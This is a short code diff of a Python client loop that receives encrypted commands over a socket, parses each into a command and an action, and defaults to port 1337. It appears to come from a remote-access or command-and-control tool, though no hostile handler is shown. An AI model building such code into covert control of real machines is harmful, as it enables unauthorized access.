@@ -17,14 +17,10 @@ def main():
     
     while True:
         data = s.recv(1024)
-        data = decrypt(data, DHKEY).split()
+        data = decrypt(data, DHKEY)
 
-        # seperate data into command and action
-        cmd, action = data[0], ' '.join(data[1:])
-
-        # allow no action
-        if action == []:
-            action = ''
+        # seperate prompt into command and action
+        cmd, _, action = data.partition(' ')
 
         # stop client
         if cmd == 'quit':
@@ -56,5 +52,5 @@ def main():
 
 
 if __name__ == '__main__':
-    PORT = int(sys.argv[1]) if sys.argv[1] else 1337
+    PORT = int(sys.argv[1]) if len(sys.argv)>1 else 1337
     main()
